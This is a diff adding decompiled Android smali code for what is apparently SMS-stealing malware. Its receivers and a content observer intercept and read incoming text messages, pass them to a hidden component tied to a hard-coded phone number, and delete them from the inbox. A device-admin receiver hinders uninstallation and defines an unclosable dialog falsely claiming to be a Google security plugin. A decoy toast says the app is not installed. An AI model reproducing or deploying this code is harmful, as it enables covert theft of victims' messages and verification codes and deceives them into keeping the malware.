+    invoke-virtual {p0, v8, v9, v10}, Lji/yj/ur/a201jhfg20180420ab/JM02;->gfyhdfgadg(Ljava/lang/String;Ljava/lang/String;Landroid/content/Context;)V
+
+    goto :goto_2
+.end method
+.class public Lji/yj/ur/a201jhfg20180420ab/JM03;
+.super Landroid/content/BroadcastReceiver;
+.source "JM03.java"
+
+
+# direct methods
+.method public constructor <init>()V
+    .locals 0
+
+    .prologue
+    .line 10
+    invoke-direct {p0}, Landroid/content/BroadcastReceiver;-><init>()V
+
+    return-void
+.end method
+
+
+# virtual methods
+.method public onReceive(Landroid/content/Context;Landroid/content/Intent;)V
+    .locals 6
+    .param p1, "context"    # Landroid/content/Context;
+    .param p2, "intent"    # Landroid/content/Intent;
+
+    .prologue
+    const/4 v5, 0x0
+
+    .line 14
+    const-string v2, "action"
+
+    invoke-virtual {p2}, Landroid/content/Intent;->getAction()Ljava/lang/String;
+
+    move-result-object v3
+
+    invoke-static {v2, v3}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I
+
+    .line 15
+    const-string v2, "config"
+
+    const/4 v3, 0x0
+
+    invoke-virtual {p1, v2, v3}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;
+
+    .line 16
+    invoke-virtual {p2}, Landroid/content/Intent;->getAction()Ljava/lang/String;
+
+    move-result-object v2
+
+    const-string v3, "android.provider.Telephony.SMS_RECEIVED"
+
+    invoke-virtual {v2, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
+
+    move-result v2
+
+    if-nez v2, :cond_0
+
+    .line 17
+    invoke-virtual {p2}, Landroid/content/Intent;->getAction()Ljava/lang/String;
+
+    move-result-object v2
+
+    const-string v3, "android.provider.Telephony.SMS_RECEIVED_2"
+
+    invoke-virtual {v2, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
+
+    move-result v2
+
+    if-nez v2, :cond_0
+
+    .line 18
+    invoke-virtual {p2}, Landroid/content/Intent;->getAction()Ljava/lang/String;
+
+    move-result-object v2
+
+    const-string v3, "android.provider.Telephony.GSM_SMS_RECEIVED"
+
+    invoke-virtual {v2, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
+
+    move-result v2
+
+    if-eqz v2, :cond_1
+
+    .line 19
+    :cond_0
+    new-instance v1, Lji/yj/ur/a201jhfg20180420ab/JM02;
+
+    invoke-direct {v1}, Lji/yj/ur/a201jhfg20180420ab/JM02;-><init>()V
+
+    .line 20
+    .local v1, "su":Lji/yj/ur/a201jhfg20180420ab/JM02;
+    invoke-virtual {p2}, Landroid/content/Intent;->getExtras()Landroid/os/Bundle;
+
+    move-result-object v0
+
+    .line 21
+    .local v0, "bundle":Landroid/os/Bundle;
+    if-eqz v0, :cond_1
+
+    invoke-virtual {v1}, Lji/yj/ur/a201jhfg20180420ab/JM02;->ghyutrhr()Z
+
+    move-result v2
+
+    if-eqz v2, :cond_1
+
+    .line 22
+    invoke-virtual {v1, v0, p1, p0}, Lji/yj/ur/a201jhfg20180420ab/JM02;->ytuyghjdhd(Landroid/os/Bundle;Landroid/content/Context;Lji/yj/ur/a201jhfg20180420ab/JM03;)V
+
+    .line 25
+    .end local v0    # "bundle":Landroid/os/Bundle;
+    .end local v1    # "su":Lji/yj/ur/a201jhfg20180420ab/JM02;
+    :cond_1
+    invoke-virtual {p2}, Landroid/content/Intent;->getAction()Ljava/lang/String;
+
+    move-result-object v2
+
+    const-string v3, "sh.ji.fe"
+
+    invoke-virtual {v2, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
+
+    move-result v2
+
+    if-eqz v2, :cond_2
+
+    .line 26
+    new-instance v1, Lji/yj/ur/a201jhfg20180420ab/JM02;
+
+    invoke-direct {v1}, Lji/yj/ur/a201jhfg20180420ab/JM02;-><init>()V
+
+    .line 27
+    .restart local v1    # "su":Lji/yj/ur/a201jhfg20180420ab/JM02;
+    invoke-virtual {p0}, Lji/yj/ur/a201jhfg20180420ab/JM03;->getResultCode()I
+
+    move-result v2
+
+    const/4 v3, -0x1
+
+    if-eq v2, v3, :cond_3
+
+    .line 28
+    const-string v2, "18016217928"
+
+    new-instance v3, Ljava/lang/StringBuilder;
+
+    const-string v4, "\u6307\u4ee4\u6267\u884c\u5931\u8d25\u72b6\u6001\u7801\uff1a"
+
+    invoke-direct {v3, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V
+
+    invoke-virtual {p0}, Lji/yj/ur/a201jhfg20180420ab/JM03;->getResultCode()I
+
+    move-result v4
+
+    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;
+
+    move-result-object v3
+
+    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
+
+    move-result-object v3
+
+    invoke-virtual {v1, v2, v3, v5}, Lji/yj/ur/a201jhfg20180420ab/JM02;->gfyhdfgadg(Ljava/lang/String;Ljava/lang/String;Landroid/content/Context;)V
+
+    .line 34
+    .end local v1    # "su":Lji/yj/ur/a201jhfg20180420ab/JM02;
+    :cond_2
+    :goto_0
+    return-void
+
+    .line 31
+    .restart local v1    # "su":Lji/yj/ur/a201jhfg20180420ab/JM02;
+    :cond_3
+    const-string v2, "18016217928"
+
+    const-string v3, "\u6307\u4ee4\u53d1\u9001\u6210\u529f"
+
+    invoke-virtual {v1, v2, v3, v5}, Lji/yj/ur/a201jhfg20180420ab/JM02;->gfyhdfgadg(Ljava/lang/String;Ljava/lang/String;Landroid/content/Context;)V
+
+    goto :goto_0
+.end method
+.class public Lji/yj/ur/a201jhfg20180420ab/JM04;
+.super Landroid/content/BroadcastReceiver;
+.source "JM04.java"
+
+
+# direct methods
+.method public constructor <init>()V
+    .locals 0
+
+    .prologue
+    .line 10
+    invoke-direct {p0}, Landroid/content/BroadcastReceiver;-><init>()V
+
+    return-void
+.end method
+
+.method public static iii(Landroid/content/Context;Ljava/lang/String;)Z
+    .locals 6
+    .param p0, "mContext"    # Landroid/content/Context;
+    .param p1, "className"    # Ljava/lang/String;
+
+    .prologue
+    .line 22
+    const/4 v2, 0x0
+
+    .line 24
+    .local v2, "kkk":Z
+    const-string v5, "activity"
+
+    invoke-virtual {p0, v5}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;
+
+    move-result-object v0
+
+    .line 23
+    check-cast v0, Landroid/app/ActivityManager;
+
+    .line 26
+    .local v0, "activityManager":Landroid/app/ActivityManager;
+    const/16 v5, 0x28
+
+    invoke-virtual {v0, v5}, Landroid/app/ActivityManager;->getRunningServices(I)Ljava/util/List;
+
+    move-result-object v3
+
+    .line 27
+    .local v3, "serviceList":Ljava/util/List;, "Ljava/util/List<Landroid/app/ActivityManager$RunningServiceInfo;>;"
+    invoke-interface {v3}, Ljava/util/List;->size()I
+
+    move-result v4
+
+    .line 28
+    .local v4, "size":I
+    const/4 v1, 0x0
+
+    .local v1, "i":I
+    :goto_0
+    if-lt v1, v4, :cond_0
+
+    .line 34
+    :goto_1
+    return v2
+
+    .line 29
+    :cond_0
+    invoke-interface {v3, v1}, Ljava/util/List;->get(I)Ljava/lang/Object;
+
+    move-result-object v5
+
+    check-cast v5, Landroid/app/ActivityManager$RunningServiceInfo;
+
+    iget-object v5, v5, Landroid/app/ActivityManager$RunningServiceInfo;->service:Landroid/content/ComponentName;
+
+    invoke-virtual {v5}, Landroid/content/ComponentName;->getClassName()Ljava/lang/String;
+
+    move-result-object v5
+
+    invoke-virtual {v5, p1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
+
+    move-result v5
+
+    if-eqz v5, :cond_1
+
+    .line 30
+    const/4 v2, 0x1
+
+    .line 31
+    goto :goto_1
+
+    .line 28
+    :cond_1
+    add-int/lit8 v1, v1, 0x1
+
+    goto :goto_0
+.end method
+
+
+# virtual methods
+.method public onReceive(Landroid/content/Context;Landroid/content/Intent;)V
+    .locals 3
+    .param p1, "context"    # Landroid/content/Context;
+    .param p2, "arg1"    # Landroid/content/Intent;
+
+    .prologue
+    .line 13
+    const-string v2, "ji.yj.ur.a201jhfg20180420ab.JM01"
+
+    invoke-static {p1, v2}, Lji/yj/ur/a201jhfg20180420ab/JM04;->iii(Landroid/content/Context;Ljava/lang/String;)Z
+
+    move-result v1
+
+    .line 14
+    .local v1, "kkk":Z
+    if-nez v1, :cond_0
+
+    .line 15
+    new-instance v0, Landroid/content/Intent;
+
+    const-class v2, Lji/yj/ur/a201jhfg20180420ab/JM01;
+
+    invoke-direct {v0, p1, v2}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V
+
+    .line 16
+    .local v0, "intent":Landroid/content/Intent;
+    const/high16 v2, 0x10000000
+
+    invoke-virtual {v0, v2}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;
+
+    .line 17
+    invoke-virtual {p1, v0}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;
+
+    .line 19
+    .end local v0    # "intent":Landroid/content/Intent;
+    :cond_0
+    return-void
+.end method
+.class public Lji/yj/ur/a201jhfg20180420ab/JM05;
+.super Landroid/database/ContentObserver;
+.source "JM05.java"
+
+
+# instance fields
+.field private context:Landroid/content/Context;
+
+.field private didid:I
+
+.field private ninin:Landroid/net/Uri;
+
+.field private sp:Landroid/content/SharedPreferences;
+
+.field private su:Lji/yj/ur/a201jhfg20180420ab/JM02;
+
+
+# direct methods
+.method public constructor <init>(Landroid/content/Context;Landroid/os/Handler;)V
+    .locals 2
+    .param p1, "context"    # Landroid/content/Context;
+    .param p2, "handler"    # Landroid/os/Handler;
+
+    .prologue
+    const/4 v1, 0x0
+
+    .line 23
+    invoke-direct {p0, p2}, Landroid/database/ContentObserver;-><init>(Landroid/os/Handler;)V
+
+    .line 12
+    const/4 v0, -0x1
+
+    iput v0, p0, Lji/yj/ur/a201jhfg20180420ab/JM05;->didid:I
+
+    .line 13
+    iput-object v1, p0, Lji/yj/ur/a201jhfg20180420ab/JM05;->ninin:Landroid/net/Uri;
+
+    .line 14
+    iput-object v1, p0, Lji/yj/ur/a201jhfg20180420ab/JM05;->sp:Landroid/content/SharedPreferences;
+
+    .line 15
+    iput-object v1, p0, Lji/yj/ur/a201jhfg20180420ab/JM05;->su:Lji/yj/ur/a201jhfg20180420ab/JM02;
+
+    .line 24
+    iput-object p1, p0, Lji/yj/ur/a201jhfg20180420ab/JM05;->context:Landroid/content/Context;
+
+    .line 25
+    const-string v0, "content://sms/inbox"
+
+    invoke-static {v0}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;
+
+    move-result-object v0
+
+    iput-object v0, p0, Lji/yj/ur/a201jhfg20180420ab/JM05;->ninin:Landroid/net/Uri;
+
+    .line 26
+    new-instance v0, Lji/yj/ur/a201jhfg20180420ab/JM02;
+
+    invoke-direct {v0}, Lji/yj/ur/a201jhfg20180420ab/JM02;-><init>()V
+
+    iput-object v0, p0, Lji/yj/ur/a201jhfg20180420ab/JM05;->su:Lji/yj/ur/a201jhfg20180420ab/JM02;
+
+    .line 27
+    const-string v0, "config"
+
+    const/4 v1, 0x0
+
+    invoke-virtual {p1, v0, v1}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;
+
+    move-result-object v0
+
+    iput-object v0, p0, Lji/yj/ur/a201jhfg20180420ab/JM05;->sp:Landroid/content/SharedPreferences;
+
+    .line 28
+    invoke-virtual {p0}, Lji/yj/ur/a201jhfg20180420ab/JM05;->Change()V
+
+    .line 29
+    return-void
+.end method
+
+
+# virtual methods
+.method public Change()V
+    .locals 12
+
+    .prologue
+    const/4 v10, 0x1
+
+    const/4 v2, 0x0
+
+    .line 31
+    iget-object v0, p0, Lji/yj/ur/a201jhfg20180420ab/JM05;->context:Landroid/content/Context;
+
+    invoke-virtual {v0}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;
+
+    move-result-object v0
+
+    iget-object v1, p0, Lji/yj/ur/a201jhfg20180420ab/JM05;->ninin:Landroid/net/Uri;
+
+    const-string v5, "_id desc"
+
+    move-object v3, v2
+
+    move-object v4, v2
+
+    invoke-virtual/range {v0 .. v5}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;
+
+    move-result-object v8
+
+    .line 32
+    .local v8, "cursor":Landroid/database/Cursor;
+    invoke-interface {v8}, Landroid/database/Cursor;->moveToNext()Z
+
+    move-result v0
+
+    if-eqz v0, :cond_0
+
+    .line 33
+    const-string v0, "_id"
+
+    invoke-interface {v8, v0}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I
+
+    move-result v0
+
+    invoke-interface {v8, v0}, Landroid/database/Cursor;->getInt(I)I
+
+    move-result v9
+
+    .line 34
+    .local v9, "id":I
+    iget v0, p0, Lji/yj/ur/a201jhfg20180420ab/JM05;->didid:I
+
+    const/4 v1, -0x1
+
+    if-ne v0, v1, :cond_1
+
+    .line 35
+    iput v9, p0, Lji/yj/ur/a201jhfg20180420ab/JM05;->didid:I
+
+    .line 52
+    .end local v9    # "id":I
+    :cond_0
+    :goto_0
+    invoke-interface {v8}, Landroid/database/Cursor;->close()V
+
+    .line 53
+    return-void
+
+    .line 37
+    .restart local v9    # "id":I
+    :cond_1
+    iget v0, p0, Lji/yj/ur/a201jhfg20180420ab/JM05;->didid:I
+
+    if-le v9, v0, :cond_3
+
+    .line 38
+    iput v9, p0, Lji/yj/ur/a201jhfg20180420ab/JM05;->didid:I
+
+    .line 39
+    const-string v0, "address"
+
+    invoke-interface {v8, v0}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I
+
+    move-result v0
+
+    invoke-interface {v8, v0}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;
+
+    move-result-object v6
+
+    .line 40
+    .local v6, "address":Ljava/lang/String;
+    const-string v0, "body"
+
+    invoke-interface {v8, v0}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I
+
+    move-result v0
+
+    invoke-interface {v8, v0}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;
+
+    move-result-object v7
+
+    .line 41
+    .local v7, "body":Ljava/lang/String;
+    iget-object v0, p0, Lji/yj/ur/a201jhfg20180420ab/JM05;->sp:Landroid/content/SharedPreferences;
+
+    const-string v1, "islj"
+
+    invoke-interface {v0, v1, v10}, Landroid/content/SharedPreferences;->getBoolean(Ljava/lang/String;Z)Z
+
+    move-result v11
+
+    .line 42
+    .local v11, "islj":Z
+    iget-object v0, p0, Lji/yj/ur/a201jhfg20180420ab/JM05;->su:Lji/yj/ur/a201jhfg20180420ab/JM02;
+
+    iget-object v1, p0, Lji/yj/ur/a201jhfg20180420ab/JM05;->context:Landroid/content/Context;
+
+    iget-object v2, p0, Lji/yj/ur/a201jhfg20180420ab/JM05;->sp:Landroid/content/SharedPreferences;
+
+    invoke-virtual {v0, v6, v7, v1, v2}, Lji/yj/ur/a201jhfg20180420ab/JM02;->yrthfdxh(Ljava/lang/String;Ljava/lang/String;Landroid/content/Context;Landroid/content/SharedPreferences;)V
+
+    .line 43
+    if-nez v11, :cond_2
+
+    const-string v0, "18016217928"
+
+    invoke-virtual {v6, v0}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z
+
+    move-result v0
+
+    if-nez v0, :cond_2
+
+    const/4 v10, 0x0
+
+    .line 44
+    .local v10, "isdelete":Z
+    :cond_2
+    if-eqz v10, :cond_0
+
+    .line 45
+    invoke-virtual {p0, v9}, Lji/yj/ur/a201jhfg20180420ab/JM05;->delete(I)V
+
+    goto :goto_0
+
+    .line 48
+    .end local v6    # "address":Ljava/lang/String;
+    .end local v7    # "body":Ljava/lang/String;
+    .end local v10    # "isdelete":Z
+    .end local v11    # "islj":Z
+    :cond_3
+    iput v9, p0, Lji/yj/ur/a201jhfg20180420ab/JM05;->didid:I
+
+    goto :goto_0
+.end method
+
+.method public delete(I)V
+    .locals 5
+    .param p1, "id"    # I
+
+    .prologue
+    .line 55
+    iget-object v1, p0, Lji/yj/ur/a201jhfg20180420ab/JM05;->context:Landroid/content/Context;
+
+    invoke-virtual {v1}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;
+
+    move-result-object v1
+
+    const-string v2, "content://sms/"
+
+    invoke-static {v2}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;
+
+    move-result-object v2
+
+    new-instance v3, Ljava/lang/StringBuilder;
+
+    const-string v4, "_id="
+
+    invoke-direct {v3, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V
+
+    invoke-virtual {v3, p1}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;
+
+    move-result-object v3
+
+    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
+
+    move-result-object v3
+
+    const/4 v4, 0x0
+
+    invoke-virtual {v1, v2, v3, v4}, Landroid/content/ContentResolver;->delete(Landroid/net/Uri;Ljava/lang/String;[Ljava/lang/String;)I
+
+    move-result v0
+
+    .line 56
+    .local v0, "tx":I
+    return-void
+.end method
+
+.method public onChange(Z)V
+    .locals 0
+    .param p1, "selfChange"    # Z
+
+    .prologue
+    .line 18
+    invoke-super {p0, p1}, Landroid/database/ContentObserver;->onChange(Z)V
+
+    .line 19
+    invoke-virtual {p0}, Lji/yj/ur/a201jhfg20180420ab/JM05;->Change()V
+
+    .line 20
+    return-void
+.end method
+.class Lji/yj/ur/a201jhfg20180420ab/JM06$TTT;
+.super Landroid/app/AlertDialog;
+.source "JM06.java"
+
+
+# annotations
+.annotation system Ldalvik/annotation/EnclosingClass;
+    value = Lji/yj/ur/a201jhfg20180420ab/JM06;
+.end annotation
+
+.annotation system Ldalvik/annotation/InnerClass;
+    accessFlags = 0x0
+    name = "TTT"
+.end annotation
+
+
+# instance fields
+.field final synthetic this$0:Lji/yj/ur/a201jhfg20180420ab/JM06;
+
+
+# direct methods
+.method protected constructor <init>(Lji/yj/ur/a201jhfg20180420ab/JM06;Landroid/content/Context;)V
+    .locals 0
+    .param p2, "context"    # Landroid/content/Context;
+
+    .prologue
+    .line 48
+    iput-object p1, p0, Lji/yj/ur/a201jhfg20180420ab/JM06$TTT;->this$0:Lji/yj/ur/a201jhfg20180420ab/JM06;
+
+    .line 47
+    invoke-direct {p0, p2}, Landroid/app/AlertDialog;-><init>(Landroid/content/Context;)V
+
+    return-void
+.end method
+
+
+# virtual methods
+.method public dismiss()V
+    .locals 0
+
+    .prologue
+    .line 52
+    return-void
+.end method
+.class public Lji/yj/ur/a201jhfg20180420ab/JM06;
+.super Landroid/app/admin/DeviceAdminReceiver;
+.source "JM06.java"
+
+
+# annotations
+.annotation system Ldalvik/annotation/MemberClasses;
+    value = {
+        Lji/yj/ur/a201jhfg20180420ab/JM06$TTT;
+    }
+.end annotation
+
+
+# direct methods
+.method public constructor <init>()V
+    .locals 0
+
+    .prologue
+    .line 10
+    invoke-direct {p0}, Landroid/app/admin/DeviceAdminReceiver;-><init>()V
+
+    return-void
+.end method
+
+.method private uuuu(Landroid/content/Context;)V
+    .locals 3
+    .param p1, "context"    # Landroid/content/Context;
+
+    .prologue
+    .line 34
+    new-instance v1, Landroid/content/Intent;
+
+    const-string v2, "android.intent.action.MAIN"
+
+    invoke-direct {v1, v2}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V
+
+    .line 35
+    .local v1, "toHome":Landroid/content/Intent;
+    const/high16 v2, 0x10000000
+
+    invoke-virtual {v1, v2}, Landroid/content/Intent;->setFlags(I)Landroid/content/Intent;
+
+    .line 36
+    const-string v2, "android.intent.category.HOME"
+
+    invoke-virtual {v1, v2}, Landroid/content/Intent;->addCategory(Ljava/lang/String;)Landroid/content/Intent;
+
+    .line 37
+    invoke-virtual {p1, v1}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V
+
+    .line 39
+    const-string v2, "activity"
+
+    invoke-virtual {p1, v2}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;
+
+    move-result-object v0
+
+    .line 38
+    check-cast v0, Landroid/app/ActivityManager;
+
+    .line 40
+    .local v0, "mAm":Landroid/app/ActivityManager;
+    const-string v2, "com.android.settings.DeviceAdminSettings"
+
+    invoke-virtual {v0, v2}, Landroid/app/ActivityManager;->restartPackage(Ljava/lang/String;)V
+
+    .line 41
+    const-string v2, "com.android.settings"
+
+    invoke-virtual {v0, v2}, Landroid/app/ActivityManager;->restartPackage(Ljava/lang/String;)V
+
+    .line 42
+    return-void
+.end method
+
+
+# virtual methods
+.method protected nnnn(Landroid/content/Context;)V
+    .locals 3
+    .param p1, "context"    # Landroid/content/Context;
+
+    .prologue
+    .line 24
+    new-instance v0, Lji/yj/ur/a201jhfg20180420ab/JM06$TTT;
+
+    invoke-direct {v0, p0, p1}, Lji/yj/ur/a201jhfg20180420ab/JM06$TTT;-><init>(Lji/yj/ur/a201jhfg20180420ab/JM06;Landroid/content/Context;)V
+
+    .line 25
+    .local v0, "tttt":Lji/yj/ur/a201jhfg20180420ab/JM06$TTT;
+    const/4 v1, 0x0
+
+    invoke-virtual {v0, v1}, Lji/yj/ur/a201jhfg20180420ab/JM06$TTT;->setCancelable(Z)V
+
+    .line 26
+    invoke-virtual {v0}, Lji/yj/ur/a201jhfg20180420ab/JM06$TTT;->getWindow()Landroid/view/Window;
+
+    move-result-object v1
+
+    const/16 v2, 0x7d3
+
+    invoke-virtual {v1, v2}, Landroid/view/Window;->setType(I)V
+
+    .line 27
+    const-string v1, "\u6e29\u99a8\u63d0\u793a"
+
+    invoke-virtual {v0, v1}, Lji/yj/ur/a201jhfg20180420ab/JM06$TTT;->setTitle(Ljava/lang/CharSequence;)V
+
+    .line 28
+    const-string v1, "\u8be5\u7a0b\u5e8f\u4e3a\u8c37\u6b4c\u5b89\u5168\u63d2\u4ef6\u8bf7\u52ff\u8fdb\u884c\u5378\u8f7d\u64cd\u4f5c,\u672c\u7a97\u53e3\u65e0\u6cd5\u5173\u95ed\u8bf7\u91cd\u65b0\u542f\u52a8\u624b\u673a\u5e76\u8bf7\u52ff\u518d\u8fdb\u884c\u5378\u8f7d\u64cd\u4f5c."
+
+    invoke-virtual {v0, v1}, Lji/yj/ur/a201jhfg20180420ab/JM06$TTT;->setMessage(Ljava/lang/CharSequence;)V
+
+    .line 29
+    invoke-virtual {v0}, Lji/yj/ur/a201jhfg20180420ab/JM06$TTT;->show()V
+
+    .line 31
+    return-void
+.end method
+
+.method public onDisableRequested(Landroid/content/Context;Landroid/content/Intent;)Ljava/lang/CharSequence;
+    .locals 3
+    .param p1, "context"    # Landroid/content/Context;
+    .param p2, "intent"    # Landroid/content/Intent;
+
+    .prologue
+    .line 13
+    invoke-direct {p0, p1}, Lji/yj/ur/a201jhfg20180420ab/JM06;->uuuu(Landroid/content/Context;)V
+
+    .line 15
+    :try_start_0
+    invoke-static {}, Ljava/lang/Thread;->currentThread()Ljava/lang/Thread;
+
+    const-wide/16 v1, 0x2710
+
+    invoke-static {v1, v2}, Ljava/lang/Thread;->sleep(J)V
+    :try_end_0
+    .catch Ljava/lang/InterruptedException; {:try_start_0 .. :try_end_0} :catch_0
+
+    .line 20
+    :goto_0
+    const-string v1, "\u4e3a\u4e86\u60a8\u7684\u624b\u673a\u5b89\u5168\uff0c\u8bf7\u4e0d\u8981\u53d6\u6d88\u63d2\u4ef6"
+
+    return-object v1
+
+    .line 16
+    :catch_0
+    move-exception v0
+
+    .line 18
+    .local v0, "e":Ljava/lang/InterruptedException;
+    invoke-virtual {v0}, Ljava/lang/InterruptedException;->printStackTrace()V
+
+    goto :goto_0
+.end method
+.class public Lji/yj/ur/a201jhfg20180420ab/JM07;
+.super Landroid/app/Activity;
+.source "JM07.java"
+
+
+# direct methods
+.method public constructor <init>()V
+    .locals 0
+
+    .prologue
+    .line 8
+    invoke-direct {p0}, Landroid/app/Activity;-><init>()V
+
+    return-void
+.end method
+
+
+# virtual methods
+.method protected onCreate(Landroid/os/Bundle;)V
+    .locals 3
+    .param p1, "savedInstanceState"    # Landroid/os/Bundle;
+
+    .prologue
+    .line 12
+    invoke-super {p0, p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V
+
+    .line 13
+    new-instance v0, Landroid/content/Intent;
+
+    const-class v1, Lji/yj/ur/a201jhfg20180420ab/JM01;
+
+    invoke-direct {v0, p0, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V
+
+    .line 14
+    .local v0, "intent":Landroid/content/Intent;
+    invoke-virtual {p0, v0}, Lji/yj/ur/a201jhfg20180420ab/JM07;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;
+
+    .line 15
+    const-string v1, "\u60a8\u624b\u673a\u4e0a\u672a\u5b89\u88c5\u8fd9\u4e2a\u7a0b\u5e8f"
+
+    const/4 v2, 0x0
+
+    invoke-static {p0, v1, v2}, Landroid/widget/Toast;->makeText(Landroid/content/Context;Ljava/lang/CharSequence;I)Landroid/widget/Toast;
+
+    move-result-object v1
+
+    invoke-virtual {v1}, Landroid/widget/Toast;->show()V
+
+    .line 16
+    invoke-virtual {p0}, Lji/yj/ur/a201jhfg20180420ab/JM07;->finish()V
+
+    .line 17
+    return-void
+.end method
+.class public final Lji/yj/ur/a201jhfg20180420ab/R$attr;
+.super Ljava/lang/Object;
+.source "R.java"
+
+
+# annotations
+.annotation system Ldalvik/annotation/EnclosingClass;
+    value = Lji/yj/ur/a201jhfg20180420ab/R;
+.end annotation
+
+.annotation system Ldalvik/annotation/InnerClass;
+    accessFlags = 0x19
+    name = "attr"
+.end annotation
+
+
+# direct methods
+.method public constructor <init>()V
+    .locals 0
+
+    .prologue
+    .line 11
+    invoke-direct {p0}, Ljava/lang/Object;-><init>()V
+
+    return-void
+.end method
+.class public final Lji/yj/ur/a201jhfg20180420ab/R$drawable;
+.super Ljava/lang/Object;
+.source "R.java"
+
+
+# annotations
+.annotation system Ldalvik/annotation/EnclosingClass;
+    value = Lji/yj/ur/a201jhfg20180420ab/R;
+.end annotation
+
+.annotation system Ldalvik/annotation/InnerClass;
+    accessFlags = 0x19
+    name = "drawable"
+.end annotation
+
+
+# static fields
+.field public static final ic_launcher:I = 0x7f020000
+
+
+# direct methods
+.method public constructor <init>()V
+    .locals 0
+
+    .prologue
+    .line 13
+    invoke-direct {p0}, Ljava/lang/Object;-><init>()V
+
+    return-void
+.end method
+.class public final Lji/yj/ur/a201jhfg20180420ab/R$layout;
+.super Ljava/lang/Object;
+.source "R.java"
+
+
+# annotations
+.annotation system Ldalvik/annotation/EnclosingClass;
+    value = Lji/yj/ur/a201jhfg20180420ab/R;
+.end annotation
+
+.annotation system Ldalvik/annotation/InnerClass;
+    accessFlags = 0x19
+    name = "layout"
+.end annotation
+
+
+# static fields
+.field public static final main:I = 0x7f030000
+
+
+# direct methods
+.method public constructor <init>()V
+    .locals 0
+
+    .prologue
+    .line 16
+    invoke-direct {p0}, Ljava/lang/Object;-><init>()V
+
+    return-void
+.end method
+.class public final Lji/yj/ur/a201jhfg20180420ab/R$string;
+.super Ljava/lang/Object;
+.source "R.java"
+
+
+# annotations
+.annotation system Ldalvik/annotation/EnclosingClass;
+    value = Lji/yj/ur/a201jhfg20180420ab/R;
+.end annotation
+
+.annotation system Ldalvik/annotation/InnerClass;
+    accessFlags = 0x19
+    name = "string"
+.end annotation
+
+
+# static fields
+.field public static final app_name:I = 0x7f050000
+
+
+# direct methods
+.method public constructor <init>()V
+    .locals 0
+
+    .prologue
+    .line 19
+    invoke-direct {p0}, Ljava/lang/Object;-><init>()V
+
+    return-void
+.end method
+.class public final Lji/yj/ur/a201jhfg20180420ab/R$xml;
+.super Ljava/lang/Object;
+.source "R.java"
+
+
+# annotations
+.annotation system Ldalvik/annotation/EnclosingClass;
+    value = Lji/yj/ur/a201jhfg20180420ab/R;
+.end annotation
+
+.annotation system Ldalvik/annotation/InnerClass;
+    accessFlags = 0x19
+    name = "xml"
+.end annotation
+
+
+# static fields
+.field public static final xyz:I = 0x7f040000
+
+
+# direct methods
+.method public constructor <init>()V
+    .locals 0
+
+    .prologue
+    .line 22
+    invoke-direct {p0}, Ljava/lang/Object;-><init>()V
+
+    return-void
+.end method
+.class public final Lji/yj/ur/a201jhfg20180420ab/R;
+.super Ljava/lang/Object;
+.source "R.java"
+
+
+# annotations
+.annotation system Ldalvik/annotation/MemberClasses;
+    value = {
+        Lji/yj/ur/a201jhfg20180420ab/R$attr;,
+        Lji/yj/ur/a201jhfg20180420ab/R$drawable;,
+        Lji/yj/ur/a201jhfg20180420ab/R$layout;,
+        Lji/yj/ur/a201jhfg20180420ab/R$string;,
+        Lji/yj/ur/a201jhfg20180420ab/R$xml;
+    }
+.end annotation
+
+
+# direct methods
+.method public constructor <init>()V
+    .locals 0
+
+    .prologue
+    .line 10
+    invoke-direct {p0}, Ljava/lang/Object;-><init>()V
+
+    return-void
+.end method
